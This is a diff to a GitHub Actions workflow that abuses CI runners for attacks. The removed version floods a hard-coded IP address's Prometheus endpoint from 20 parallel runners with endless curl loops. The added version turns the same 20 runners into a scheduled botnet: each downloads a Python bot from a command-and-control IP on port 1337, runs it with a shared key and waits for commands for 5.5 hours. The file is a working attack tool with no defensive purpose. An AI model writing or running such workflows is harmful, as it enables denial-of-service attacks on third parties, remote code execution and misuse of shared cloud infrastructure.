@@ -1,57 +1,43 @@
 # ╔══════════════════════════════════════════════╗
-# ║  CC ATTACK v3 — Prometheus Amplification   ║
-# ║  20 runners × N threads = direct fire      ║
+# ║  HUNT BOT FLEET — C2 Controlled            ║
+# ║  20 runners connect to C2, wait for commands║
 # ╚══════════════════════════════════════════════╝
-name: CC Attack v3
+name: Hunt Bot Fleet
 
 on:
   workflow_dispatch:
     inputs:
-      target:
-        description: 'Target URL'
+      c2:
+        description: 'C2 IP'
         required: true
-        default: 'http://39.108.122.80/actuator/prometheus'
-      threads:
-        description: 'Threads per runner'
+        default: '216.167.26.154'
+      c2_port:
+        description: 'C2 Port'
         required: true
-        default: '10'
-      duration:
-        description: 'Duration (seconds)'
-        required: true
-        default: '300'
+        default: '1337'
   schedule:
-    - cron: '13 */2 * * *'
+    - cron: '7 */3 * * *'
 
 jobs:
-  attack:
+  bot:
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 20
       matrix:
         slice: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
     steps:
-      - name: CC Attack
+      - name: Connect to C2
         run: |
-          TARGET="${{ github.event.inputs.target }}"
-          THREADS="${{ github.event.inputs.threads }}"
-          DURATION="${{ github.event.inputs.duration }}"
+          C2="${{ github.event.inputs.c2 }}"
+          CPORT="${{ github.event.inputs.c2_port }}"
 
-          echo "╔══════════════════════════════════╗"
-          echo "║  CC Attack Runner ${{ matrix.slice }}           ║"
-          echo "║  Target: $TARGET"
-          echo "║  Threads: $THREADS"
-          echo "║  Duration: ${DURATION}s"
-          echo "╚══════════════════════════════════╝"
+          echo "[+] Runner ${{ matrix.slice }} → C2: $C2:$CPORT"
 
-          # Launch curl threads
-          for i in $(seq 1 $THREADS); do
-            (while true; do
-              curl -s -m 15 -o /dev/null "$TARGET" 2>/dev/null
-            done) &
-          done
+          # Download and run Python bot
+          curl -s "http://$C2:$CPORT/bot.py" -o /tmp/bot.py
+          python3 /tmp/bot.py "$C2" "$CPORT" "enibot2024" "gh-${{ matrix.slice }}" &
 
-          echo "[+] $THREADS threads launched"
+          echo "[+] Bot registered"
 
-          # Run for duration then exit (kills all child processes)
-          sleep $DURATION
-          echo "[+] Done — runner ${{ matrix.slice }}"
+          # Keep alive for 5.5 hours (GitHub Actions max is 6h)
+          sleep 19800
